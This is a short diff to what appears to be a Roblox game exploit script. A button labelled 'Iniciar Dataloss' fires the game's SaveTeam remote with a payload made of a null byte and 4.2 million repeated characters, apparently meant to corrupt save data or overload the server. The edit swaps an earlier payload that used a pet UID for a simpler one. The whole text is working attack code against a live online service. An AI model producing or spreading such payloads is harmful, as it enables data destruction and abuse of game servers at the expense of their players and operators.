@@ -20,11 +20,7 @@ local A = Y.Button({
     Callback = function()
         if Type == "Iniciar Dataloss" then
                     local args = {
-                        [1] = {
-                            ["1\0" .. string.rep("B", 4200000)] = require(game.ReplicatedStorage.ModuleScripts.LocalDairebStore).GetStoreProxy("GameData"):GetData("Pets")[1].UID
-                        },
-                        [2] = "AFS_Is_Dogshit",
-                        [3] = 3
+                       [1] = "\0" .. string.rep("B", 4200000)
                     }
 
                     game:GetService("ReplicatedStorage").Remote.SaveTeam:FireServer(unpack(args))
